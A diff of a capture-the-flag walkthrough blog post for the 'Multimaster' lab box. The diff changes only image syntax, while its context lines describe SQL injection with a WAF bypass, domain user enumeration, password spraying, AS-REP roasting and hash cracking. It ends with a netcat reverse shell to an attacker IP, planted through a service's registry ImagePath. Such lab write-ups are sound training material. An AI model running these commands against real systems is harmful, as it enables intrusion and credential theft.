@@ -104,7 +104,7 @@ As we can see, it looks like a pretty standard Windows server setup. We get the 
 
 We see land on a page that is called the Employee Hub.
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-62.png" >}}
+![](/images/2020/04/image-62.png)
 
 Before we tart poking around the source of this page, let's kick off a `gobuster` to see what we might be able to find.
 
@@ -115,7 +115,7 @@ In this case we're specifying the `-s` to only show codes for 200 and 302, other
 
 We'll start browsing the site to see what type of information we can find. When we click on the 'Colleague Finder' We are given a list of users with email. We'll save these names and emails and add them to a list. Once we have them in a list it looks like this:
 
-{{< figure src="__GHOST_URL__/content/images/2020/04/image-63.png" >}}
+![](/images/2020/04/image-63.png)
 
 We want to clean that up we delete all the lines with spaces in them.
 
@@ -131,15 +131,15 @@ Now that we have our user list cleaned up we can take a peek at what's is happen
 
 When we look at the request on the search page, we see that the `POST` is sent to `/api/getColleagues`. The `/api` url is something we might want to fuzz as well.
 
-{{< figure src="__GHOST_URL__/content/images/2020/05/image-68.png" >}}
+![](/images/2020/05/image-68.png)
 
 If we send this request to `repeater` inside `Burpsuite`, we can start fuzzing it. Sending special characters to the field yeilds some interesting responses. When we send `'` we get a 403, when we send a `*` we get nothing back. If we send a `%` we get everyone back. This would lead you to believe there is some kind of potential `SQL injection` here. Another thing of note is we often get back just dead brackets `[]` So there could be some kind of ingress / egress filtering happening. Below is a small clip showing that we can use some [basic WAF bypass techniques](https://medium.com/@Pentestit_ru/bypassing-waf-4cfa1aad16bf) to show there does seem to be some kind of WAF.
 
-{{< figure src="__GHOST_URL__/content/images/2020/05/multimaster_waf.gif" >}}
+![](/images/2020/05/multimaster_waf.gif)
 
 While doing research on this, I came accross [this resource](https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/) that suggested using `\u` to send Unicode in a Hex format.
 
-{{< figure src="__GHOST_URL__/content/images/2020/05/image-69.png" >}}
+![](/images/2020/05/image-69.png)
 
 This seems to give us a valid value back. Luckily for us, `SQLMap` provides a way for us to create what's called a `Tamper Script` to fuzz / inject this request. 
 
@@ -159,7 +159,7 @@ I run `hashcat` on my Windows machine, so you're command might be slightly diffe
 
 That runs and we have three matches:
 
-{{< figure src="__GHOST_URL__/content/images/2020/05/image-70.png" caption="" >}}
+![](/images/2020/05/image-70.png" caption=")
 
 Now we have a list of passwords and a list of users, but when we run them nothing matches. It looks like we'll need to find another way to enumerate users within the domain. Research lead me [here](https://nest.parrot.sh/packages/tools/metasploit-framework/blob/e69624a76d4a3b6c334e051d11b55c3d7e4d85c5/modules/auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli.rb) since I knew there was already a `Metasploit` module for AD enumeration via SQL and SQLi. What's important here is that we can see on line 153 the SQL command `Metasploit` runs to enumerate Domain  SID. So we can combine our knowledge of the SQL statment used to craft an SQL Injection to obtain the Domain Admin RID. Eventually we create the following injection:
 
@@ -168,7 +168,7 @@ Command:
 
 Now we need to encode it. I used [this site](https://onlineutf8tools.com/convert-utf8-to-hexadecimal) to format the string intially. Then a quick find and replace (Find: 0x Replace with: \u00) to format it appropriately. We send it to repeater in `Burpsuite` and get our RID back!
 
-{{< figure src="__GHOST_URL__/content/images/2020/05/image-71.png" >}}
+![](/images/2020/05/image-71.png)
 
 Now that we know the Domain RID we can determine the SID. The RID is the base for all of the SID's on the domain. The first 48 bytes of the RID above gives us our base SID: `0x0105000000000005150000001C00D1BCD181F1492BDFC236`. We can use it to enumerate users and groups based on [this module](https://nest.parrotsec.org/packages/tools/metasploit-framework/-/blob/e69624a76d4a3b6c334e051d11b55c3d7e4d85c5/modules/auxiliary/admin/mssql/mssql_enum_domain_accounts.rb). We modify our SQL statment to be:
 
@@ -177,20 +177,20 @@ Command:
 
 When we run it, sure enough we get back the group associated - Domain Admins, as expected.
 
-{{< figure src="__GHOST_URL__/content/images/2020/05/image-72.png" >}}
+![](/images/2020/05/image-72.png)
 
 Now our PoC works, we just need to wrap it up into something more efficient and repeat the process over and over. Under 'Manually Enumerating Domains' on [this resource](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/), we are told the process we need to follow to enumerate every domain user.
 
 This is done best in python. Here's a link to my script. After we run it, these are the results we get:
 
-{{< figure src="__GHOST_URL__/content/images/2020/05/image-75.png" >}}
+![](/images/2020/05/image-75.png)
 
 Awesome, now we have a list of usernames to append to our username listing. We can now retry a spray against the domain with these new users added to the list.
 
 Command:
 `hydra -L username.lst -P passwords 10.10.10.179 smb`
 
-{{< figure src="__GHOST_URL__/content/images/2020/05/image-76.png" >}}
+![](/images/2020/05/image-76.png)
 
 We get a matching set! Now we can use `Evil-WinRM` to log in as this user.
 
@@ -203,7 +203,7 @@ Commands:
 `upload ~/Tools/SharpHound.exe`
 `.\SharpHound.exe`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image.png" >}}
+![](/images/2020/06/image.png)
 
 We'll download the output from `SharpHound` then we'll upload `winPEAS` the same way.
 
@@ -220,23 +220,23 @@ WinPEAS didn't return much of anything. Once we load the data into BloodHound, w
 
 This will return all the groups in the domain. This will allow us to inspect them and see the relationships, if any, between other objects.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-1.png" >}}
+![](/images/2020/06/image-1.png)
 
 As we sift through the groups, we see one noted as `Developers` with 4 direct members.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-2.png" >}}
+![](/images/2020/06/image-2.png)
 
 What is of interest here is we have Jorden's account with also has haccess to the `Server Operators` group.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-3.png" >}}
+![](/images/2020/06/image-3.png)
 
 It would seem like this could be our path forward but how. We'll need to enumerate further. Our `winPEAS` results weren't that great but that can often be the case when permissions are lacking. I generally do a second round of enumeration on every box by hand for missing links. In this case, we will issue the `PowerShell` command `get-process` to see what's running on the current system.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-4.png" >}}
+![](/images/2020/06/image-4.png)
 
 In this case, we see the process `Code` quite a few times. A [quick google](https://www.file.net/process/code.exe.html) shows us that this is `VSCode`. We can confirm this by heading to `C:\Program Files\` and indeed see `VSCode` listed.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-5.png" >}}
+![](/images/2020/06/image-5.png)
 
 Google for `Visual Studio Code CVE` shows that there have been some recent vulnerabilities. [This post](https://iwantmore.pizza/posts/cve-2019-1414.html) in particular is interesting. Now we have two potential vectors here. One using a `Metasploit` payload and creating a port forward of the ports and executing the PoC code listed. Or we can use [this GitHub](https://github.com/taviso/cefdebug) tool. This lets us interact with the debug ports in a malicious way. We can upload this tool as well as `netcat` to get a shell.
 
@@ -249,7 +249,7 @@ With these two on the system we can use `cefdebug.exe` to check what port might 
 Command:
 `.\cefdebug.exe`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-6.png" >}}
+![](/images/2020/06/image-6.png)
 
 Now that we know our port, we can issue a remote command like noted in the documentation. The port is changing every 20 seconds or so, so we'll need to create our payload ahead of time so we can be time efficient.
 
@@ -260,11 +260,11 @@ Payload:
 
 When we run it, we get a connection back as `cyork`.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-9.png" >}}
+![](/images/2020/06/image-9.png)
 
 Now we need to start enumerating as this user. As we are enumerating we see an interesting DLL and PDB file in the `bin` directory of `wwwroot`.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-10.png" >}}
+![](/images/2020/06/image-10.png)
 
 We'll use `copy-item` PowerShell command in conjunction with our own `SMB` server. First we spin up an `SMB` server:
 
@@ -279,17 +279,17 @@ Command:
 
 With some luck we can analyze the PDB and .DLL for some passwords. A quick `strings` on the .dll doesn't give anything. When we `cat` the .dll we see something useful!
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-11.png" >}}
+![](/images/2020/06/image-11.png)
 
 There is a password string - `D3veL0pM3nT!` Normally, I would open this file with `dotPeek` but this time `cat` got the job done! For those interested, here is it's location within the DLL.
 
 Under the MultimasterAPI.Controllers > HttpResponseMessage:
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-12.png" >}}
+![](/images/2020/06/image-12.png)
 
 Now with a new password, we can try to connect with it. We weren't able to connect as the user `finder` but we will reuse this password for all users in the development group that we saw above. We are able to log in as `sbauer`.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-13.png" >}}
+![](/images/2020/06/image-13.png)
 
 Awesome, more enumeration! We don't find much more in terms of access. We know that we want to gain access to the `Server Operators` group somehow either as `Jorden` or as another entity. In this scenario we want to attempt a `Kerberoast` of the target, but `BloodHound` shows us that no users have the property, `DONT_REQ_PREAUTH`, set accordingly. However, it looks like we actually have the ability to set it!
 
@@ -301,22 +301,22 @@ Now with this set, we should be able to use Impackets `GetNPUsers` to obtain a h
 Command:
 `python3 GetNPUsers.py megacorp.local/sbauer:"D3veL0pM3nT!" -dc-ip multimaster.htb -request`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-14.png" >}}
+![](/images/2020/06/image-14.png)
 
 Sure enough, it works! We can now take this hash and send it to `hashcat`.
 
 Command:
 `.\hashcat64.exe -m 18200 -D 1 -a 0 -n 10 .\jorden.txt .\rockyou.txt -o jorden_out.txt --force`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-15.png" >}}
+![](/images/2020/06/image-15.png)
 
 We see a password of `rainforest786`. Now we will login as Jorden!
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-16.png" >}}
+![](/images/2020/06/image-16.png)
 
 Still no access to our root flag yet! We need to continue to enumerate. This time `winPEAS` does give us what we want right away! We see that we have the ability to modify registry entries of services. Sow e can simply modify a services registry entry so that it will send a connection back to use as System!
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-18.png" >}}
+![](/images/2020/06/image-18.png)
 
 For this to work, we need a service that is already stopped. All of the tools I would use to check the current running services are denied. So in this case, I did each int he list one at a time....
 
@@ -331,7 +331,7 @@ ImagePath /t REG_EXPAND_SZ /d "C:\tmp\nc.exe 10.10.14.143 6969 -e powershell.exe
 Then we start the service:
 `sc.exe start SensorDataService`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/multimaster_root.gif" >}}
+![](/images/2020/06/multimaster_root.gif)
 
 Then we get our shell back as System. Box complete!
 
